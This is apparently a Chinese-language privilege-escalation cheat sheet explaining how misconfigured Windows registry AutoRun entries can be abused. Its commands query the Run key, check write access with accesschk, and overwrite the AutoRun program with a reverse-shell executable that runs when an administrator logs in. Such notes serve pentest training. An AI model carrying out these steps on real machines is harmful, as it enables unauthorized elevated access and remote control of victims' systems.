# 注册表配置错误-自动运行

原理：Windows 可以配置为在启动时以提升的权限运行命令。这些“自动运行”在注册表中配置。如果您能够写入 **AutoRun 可执行文件**，并且能够重新启动系统（或等待它重新启动），可能能够提升权限

```bash
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run  //查询autorun中哪些可以自动运行
accesschk.exe /accepteula -wvu "C:\Program Files\Autorun Program\program.exe"  //查看用户对文件的权限，结果发现用户可以完全访问文件
copy C:\PrivEsc\reverse.exe "C:\Program Files\Autorun Program\program.exe" /Y   //复制创建的反向shell并将它覆盖 AutoRun 的可执行文件
需要等待管理员进行登录rdp 后shell才会被弹出
```